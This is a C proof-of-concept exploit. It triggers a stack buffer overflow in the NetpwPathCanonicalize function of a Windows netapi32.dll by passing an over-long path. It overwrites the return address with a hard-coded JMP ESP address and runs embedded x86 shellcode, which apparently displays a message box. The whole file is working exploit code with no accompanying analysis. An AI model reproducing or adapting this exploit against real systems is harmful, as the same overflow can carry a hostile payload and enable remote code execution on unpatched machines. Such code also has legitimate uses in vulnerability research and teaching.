#include <windows.h>
#include <stdio.h>

typedef int (__stdcall *MYPROC) (LPWSTR,  LPWSTR, DWORD,LPWSTR, LPDWORD,DWORD);

// address of jmp esp
#define JMP_ESP "\x5D\x38\x82\x7C\x00\x00"

//shellcode
#define SHELL_CODE \
"\x90\x90\x90\x90" \
"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C" \
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53" \
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B" \
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95" \
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59" \
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A" \
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75" \
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03" \
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB" \
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50" \
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x00\x00"

int main(int argc, char* argv[])
{
    WCHAR path[256];
    WCHAR can_path[256];
    DWORD type = 1000; 
    int retval;
    HMODULE handle = LoadLibrary(".\\netapi32.dll");
    MYPROC Trigger = NULL;

    if (NULL == handle)
    {
        wprintf(L"Fail to load library!\n");
        return -1;
    }

    Trigger = (MYPROC)GetProcAddress(handle, "NetpwPathCanonicalize");
    if (NULL == Trigger)
    {
        FreeLibrary(handle);
        wprintf(L"Fail to get api address!\n");
        return -1;
    }

    path[0] = 0;
    wcscpy(path, L"\\aaa\\..\\..\\bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb");
    wcscat(path, JMP_ESP);
    wcscat(path, SHELL_CODE);
    can_path[0] = 0;
    type = 1000;
    wprintf(L"BEFORE: %s\n", path);
    retval = (Trigger)(path, can_path, 1000, NULL, &type, 1);
    wprintf(L"AFTER : %s\n", can_path);
    wprintf(L"RETVAL: %s(0x%X)\n\n", retval?L"FAIL":L"SUCCESS", retval);

    FreeLibrary(handle);

    return 0;
}

